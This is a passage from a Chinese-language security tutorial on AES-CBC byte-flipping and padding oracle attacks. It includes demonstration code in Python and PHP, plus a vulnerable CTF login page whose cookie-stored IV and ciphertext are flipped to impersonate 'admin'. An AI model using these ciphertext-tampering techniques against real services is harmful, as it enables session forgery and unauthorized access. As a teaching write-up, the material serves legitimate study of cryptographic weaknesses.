class="line">evil_IVList=old_IVList</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(sourceStr):</span><br><span class="line">    sourceStrList.append(<span class="built_in">ord</span>(i))</span><br><span class="line"></span><br><span class="line">evil_IVList[<span class="number">9</span>]=sourceStrList[<span class="number">9</span>]^old_IVList[<span class="number">9</span>]^<span class="number">0</span>  <span class="comment">#让第10位消失</span></span><br><span class="line">evil_IVList[<span class="number">10</span>]=sourceStrList[<span class="number">10</span>]^old_IVList[<span class="number">10</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;D&#x27;</span>)  <span class="comment">#让解出来的明文第11位为D</span></span><br><span class="line">evil_IVList[<span class="number">11</span>]=sourceStrList[<span class="number">11</span>]^old_IVList[<span class="number">11</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;!&#x27;</span>)  <span class="comment">#再加个!</span></span><br><span class="line">evil_IV=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> evil_IVList:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])==<span class="number">1</span>:  <span class="comment">#为了保证构造出来的IV是16byte,1位的16进制补0变成2位</span></span><br><span class="line">        evil_IV+=<span class="string">&#x27;0&#x27;</span>+<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        evil_IV += <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">evil_IV=codecs.decode(evil_IV,<span class="string">&#x27;hex_codec&#x27;</span>)  <span class="comment">#恶意构造的16byte IV</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;恶意构造出的IV:&quot;</span>,evil_IV)</span><br><span class="line">aes = AES.new(SECRET_KEY,AES.MODE_CBC,evil_IV)</span><br><span class="line">dsc=aes.decrypt(cipher).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;利用恶意构造的IV结出来的明文:&quot;</span>,dsc)</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200629095331371.png" alt="image-20200629095331371"></p><h3 id="5-3-一个例子"><a href="#5-3-一个例子" class="headerlink" title="5.3 一个例子"></a>5.3 一个例子</h3><p>比方说，我们有这样的明文序列：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">4</span><span class="punctuation">:</span><span class="string">&quot;name&quot;</span>;s<span class="punctuation">:</span><span class="number">6</span><span class="punctuation">:</span><span class="string">&quot;sdsdsd&quot;</span>;s<span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span><span class="string">&quot;greeting&quot;</span>;s<span class="punctuation">:</span><span class="number">20</span><span class="punctuation">:</span><span class="string">&quot;echo &#x27;Hello sdsdsd!&#x27;&quot;</span>;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>我们的目标是将“<code>s:6</code>”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成&#96;&#96;16&#96;个字节的块：</p><ul><li>Block 1:<code>a:2:&#123;s:4:&quot;name&quot;;</code></li><li>Block 2:<code>s:6:&quot;sdsdsd&quot;;s:8</code></li><li>Block 3:<code>:&quot;greeting&quot;;s:20</code></li><li>Block 4:<code>:&quot;echo &#39;Hello sd</code></li><li>Block 5:<code>sdsd!&#39;&quot;;&#125;</code></li></ul><p>因此，我们的目标字符位于块2，这意味着我们需要改变块1的密文来改变第二块的明文。</p><p>有一条经验法则是：</p><blockquote><p>你在密文中改变的字节，<strong>只</strong>会影响到在下一明文当中，具有相同偏移量的字节。</p></blockquote><p>所以我们目标的偏移量是2：</p><ul><li>[0] &#x3D; s</li><li><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/115.png">1</a> &#x3D; :</li><li><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/216.png">2</a> &#x3D;6</li></ul><p>因此我们要改变在第一个密文块当中，偏移量是2的字节。正如你在下面的代码当中看到的，在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p><ol><li><code>$v = &quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;&#125;&quot;;</code></li><li><code>$enc = @encrypt($v);</code></li><li><code>$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));</code></li><li><code>$b = @decrypt($enc);</code></li></ol><p>运行这段代码后，我们可以将数字6变为7：</p><p>但是我们在第3行中，是如何改变字节成为我们想要的值呢？</p><p>基于上述的解密过程，我们知道有，<em>A &#x3D; Decrypt(Ciphertext)<em>与</em>B &#x3D; Ciphertext-N-1</em>异或后最终得到<em>C &#x3D; 6</em>。等价于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C = A XOR B</span><br></pre></td></tr></table></figure><p>所以，我们唯一不知道的值就是A（注：对于B，C来说）（<em>block cipher decryption</em>）;借由XOR，我们可以很轻易地得到A的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A = B XOR C</span><br></pre></td></tr></table></figure><p>最后，A XOR B XOR C等于0。</p><p>有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，就像这样：</p><p><code>A XOR B XOR C XOR &quot;7&quot;</code>会在块2的明文当中，偏移量为2的字节处得到7。</p><p>下面是相关原理实现的PHP源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MY_AES_KEY&#x27;</span>, <span class="string">&quot;abcdef0123456789&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$encrypt</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$aes</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128, <span class="string">&#x27;&#x27;</span>, MCRYPT_MODE_CBC, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="string">&quot;1234567891234567&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$aes</span>, MY_AES_KEY, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encrypt</span> ? <span class="title function_ invoke__">mcrypt_generic</span>(<span class="variable">$aes</span>,<span class="variable">$data</span>) : <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$aes</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MY_MAC_LEN&#x27;</span>, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">aes</span>(<span class="variable">$data</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">aes</span>(<span class="variable">$data</span>, <span class="literal">false</span>), <span class="string">&quot;\0&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$v</span> = <span class="string">&quot;a:2:&#123;s:4:\&quot;name\&quot;;s:6:\&quot;sdsdsd\&quot;;s:8:\&quot;greeting\&quot;;s:20:\&quot;echo &#x27;Hello sdsdsd!&#x27;\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Plaintext before attack: <span class="subst">$v</span>\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$enc</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$enc</span> = @<span class="title function_ invoke__">encrypt</span>(<span class="variable">$v</span>);</span><br><span class="line"><span class="variable">$enc</span>[<span class="number">2</span>] =  <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$enc</span>[<span class="number">2</span>]) ^ <span class="title function_ invoke__">ord</span>(<span class="string">&quot;6&quot;</span>) ^ <span class="title function_ invoke__">ord</span> (<span class="string">&quot;7&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = @<span class="title function_ invoke__">decrypt</span>(<span class="variable">$enc</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Plaintext AFTER attack : <span class="subst">$b</span>\n&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="0x06-padding-oracle攻击原理"><a href="#0x06-padding-oracle攻击原理" class="headerlink" title="0x06 padding oracle攻击原理"></a>0x06 padding oracle攻击原理</h2><h3 id="6-1-概要"><a href="#6-1-概要" class="headerlink" title="6.1 概要"></a>6.1 概要</h3><p>padding oracle是用来获取明文source_Str的，</p><p>但更准确的说应该是获取中间值middlecipher的。</p><p>获取了中间值之后，如果我们知道了初始IV和密文cipher后，</p><p>就可以得到明文sourceStr（<code>sourceStr=middlecipher^old_IV</code>）</p><p>然后我们就可以进行CBC字节翻转攻击</p><h3 id="6-2-详解"><a href="#6-2-详解" class="headerlink" title="6.2 详解"></a>6.2 详解</h3><p>CBC加密模式要对明文进行分组(通常为8或16字节，取决于算法，比如AES-128-CBC就是16字节,128bit&#x3D;16byte),CBC分组遵循PKCS#5标准，填充的字符为余下字节的个数。用8byte分组做例子的话，如下图，需注意即便分组内容能正好平均分为n组，仍需要在最后一组后面填充一个八位分组，</p><p>CBC加密模式要对明文进行分组(通常为8或16字节，取决于算法，比如AES-128-CBC就是16字节,128bit&#x3D;16byte),CBC分组遵循PKCS#5标准，填充的字符为余下字节的个数。用8byte分组做例子的话，如下图，需注意即便分组内容能正好平均分为n组，仍需要在最后一组后面填充一个八位分组，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-911e905ee20482be.png" alt="图片.png"></p><h3 id="6-3-服务器判断过程"><a href="#6-3-服务器判断过程" class="headerlink" title="6.3 服务器判断过程"></a>6.3 服务器判断过程</h3><p>假设我们向服务器提交了正确的密码，我们的密码在经过CBC模式加密后传给</p><p>了服务器，这时服务器会对我们传来的信息尝试解密，如果可以正常解密会返</p><p>回一个值表示正确，如果不能正常解密则会返回一个值表示错误。而事实上，</p><p>判断提交的密文能不能正常解密，第一步就是判断密文最后一组的填充值是否</p><p>正确，也就是观察最后一组解密得到的结果的最后几位，如果错误将直接返回</p><p>错误，如果正确，再将解密后的结果与服务器存储的结果比对，判断是不是正</p><p>确的用户。也就是说服务器一共可能有三种判断结果：</p><ul><li>如果参数是完全正确的，身份认证成功，返回 HTTP 200 OK，提示认证成功(也就是解密的明文正确)</li><li>如果参数是可以解密为正确格式的明文的密文（明文 Padding 等正确），但是身份认证失败，返回 HTTP 200 OK，提示认证失败（只有padding格式正确，我们主要利用这一点）</li><li>如果参数不是可以解密为正确格式的明文的密文（明文的 Padding 错误等），服务器内部抛出异常，返回 HTTP 500 Internal Server Error</li><li>其中第一种情况与第二 三种情况的返回值一定不一样，这就给了我们可乘之机——我们可以利用服务器的返回值判断我们提交的内容能不能正常解密，进一步讲，我们可以知道最后一组密文的填充位符不符合填充标准。</li></ul><h3 id="6-4-padding-oracle-attack核心"><a href="#6-4-padding-oracle-attack核心" class="headerlink" title="6.4 padding oracle attack核心"></a>6.4 padding oracle attack核心</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-77a058a532beb7ed.png" alt="图片.png"></p><p>如上图所示，明文填充了四位时，如果最后一组密文解密后的结果</p><p>（Intermediary Value也就是中间值）与前一组密文（Initialization Vector也就是IV值）异或得到的最后四位是0×04，那么服务器就会返回可以正常解密。</p><p>CBC模式的解密过程，第n组密文解密后的中间值与前一组的密文异或便可得到</p><p>明文，现在我们不知道解密的密钥key，但我们知道所有的密文，因此只要我们</p><p>能够得到中间值便可以得到正确的明文（进行一次异或运算便可），而中间值</p><p>是由服务器解密得到的，因此我们虽然不知道怎么解密但我们可以利用服务器</p><p>帮我们解密，我们所要做的是能确定我们得到的中间值是正确的，这也是</p><p>padding oracle attack的核心——找出正确的中间值。</p><ul><li>(1）假设我们捕获到了传输的密文并且我们知道是CBC模式采用的什么加密算法，我们把密文按照加密算法的要求分好组，然后对倒数第二组密文进行构造；</li><li>(2）先假定明文只填充了一字节，对倒数第二组密文的最后一字节从0×00到0xff逐个赋值并逐个向服务器提交，直到服务返回值表示构造后的密文可以正常解密，这意味着构造后的密文作为中间值（图中黄色的那一行）解密最后一组明文，明文的最后一位是0×01（如图所示），也就是说构造的倒数第二组密文的最后一字节与最后一组密文对应中间值（绿色的那一行）的最后一位相异或的结果是0×01<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-df79e1a197ec978c.png" alt="图片.png"></li><li>（3）利用异或运算的性质，我们把我们构造的密文的最后一字节与0×01异或便可得到最后一位密文解密后的中间值是什么，这里我们设为M1，这一过程其实就是对应下图CBC解密过程中红圈圈出来的地方，1就是我们想要得到的中间值，二就是我们构造的密文也就是最后一组密文的IV值，我们已经知道了plaintext的最后一字节是0×01，从图中可以看到它是由我们构造的IV值与中间值的最后一字节异或得到的；<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-c8e9fff96ff38edc.png" alt="图片.png"></li><li>（4）再假定明文填充了两字节也就是明文最后两字节是0×02，接着构造倒数第二组密文，我们把M1与0×02异或可以得到填充两字节时密文<br>的最后一位应该是什么，这时候我们只需要对倒数第二位进行不断地赋值尝试（也是从0×00到0xff），当服务器返回值表示可以正常解密时<br>，我们把此时的倒数第二位密文的取值与0×02异或便可得到最后一组密文倒数第二字节对应的中间值；</li><li>（5）后再构造出倒数第三倒数第四直到得到最后一组密文的中间值，把这个中间值与截获的倒数第二组密文异或便可得到最后一组分组的明文；</li><li>（6）舍弃掉最后一组密文，只提交第一组到倒数第二组密文，通过构造倒数第三组密文得到倒数第二组密文的铭文，以此类推，最后我们便<br>可以得到全部的明文</li></ul><h3 id="6-5-攻击成立的条件"><a href="#6-5-攻击成立的条件" class="headerlink" title="6.5 攻击成立的条件"></a>6.5 攻击成立的条件</h3><p>攻击成立的两个重要假设前提:</p><ul><li>攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）</li><li>攻击者能够触发密文的解密过程，且能够知道密文的解密结果（是否是正常解密）</li></ul><h2 id="0x07-运用-参考"><a href="#0x07-运用-参考" class="headerlink" title="0x07 运用(参考)"></a>0x07 运用(参考)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/root/key&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">16</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">get_random_iv</span>();</span><br><span class="line">    <span class="variable">$plain</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;iv&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;cipher&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;iv&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cipher</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]);</span><br><span class="line">        <span class="variable">$iv</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;iv&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$plain</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line">            <span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$plain</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$plain</span>).<span class="string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>,<span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$password</span>);</span><br><span class="line">        <span class="title function_ invoke__">login</span>(<span class="variable">$info</span>);</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">check_login</span>();</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;body class=&quot;login-body&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;wrapper&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;header&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;content&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;footer&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1.如果username&#x3D;&#x3D;&#x3D;admin就输出flag，但是禁止了admin登陆。<br>2.把username和password构造为一个数组，然后进行序列化，并对这个序列化对象进行aes-128-cbc加密，iv值为16位随机数。加密值赋值给cipher。<br><a href="http://php.net/manual/zh/function.openssl-encrypt.php">openssl_encrypt()函数</a><br>3.session[username]&#x3D;username序列化并cbc加密后的值。对iv和cipher进行base64加密并设置了cookie<br>4.最后对cipher和iv进行base64解密。然后对cipher进行cbc解密，如果与原序列化对象值相等则对其进行反序列化，错误则报错 <code>die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;</code>。把反序列化后username值赋给session[username]。</p><p>上面就是整个过程。这里把登录的用户名及其密码存入数组，序列化后进行AES-CBC模式的加密，其中iv，和密文以cookie储存，可以控制，导致存在攻击的可能。<br>使用skctf登陆，因为翻转目标是admin5位，所以登陆的用户名最好也为5位。登陆后存入数组序列化后变为： <code>a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;skctf&quot;;s:8:&quot;password&quot;;s:5:&quot;skctf&quot;;&#125;</code><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-26714ee7ebb9ae3c.png" alt="图片.png"></p><p>1.首先将明文修改为16字节的四组：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a<span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span><span class="string">&quot;userna</span></span><br><span class="line"><span class="string">me&quot;</span>;s<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="string">&quot;skctf&quot;</span>;</span><br><span class="line">s<span class="punctuation">:</span><span class="number">8</span><span class="punctuation">:</span><span class="string">&quot;password&quot;</span>;s</span><br><span class="line"><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="string">&quot;skctf&quot;</span>;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>2.根据CBC攻击原理，只要修改第一组密文对应第二组’skctf’的位置的明文，就可以实现对第二组明文的改变。即第10-14位。（<strong>我们抓包获得的cipher是所有加密后的密文，因此只要我们更改cipher中第10-14位就可以。因为第二组明文和第一组密文已知，则可以求出第二组的中间值。将中间值中对应的第10-14位和明文中的skctf进行异或则可以得到应该修改的cipher的第10-14位的值。</strong>）<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-7fe2df1d21ce62a8.png" alt="图片.png"></p><p>3.下面是网上找的重新生成密文的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 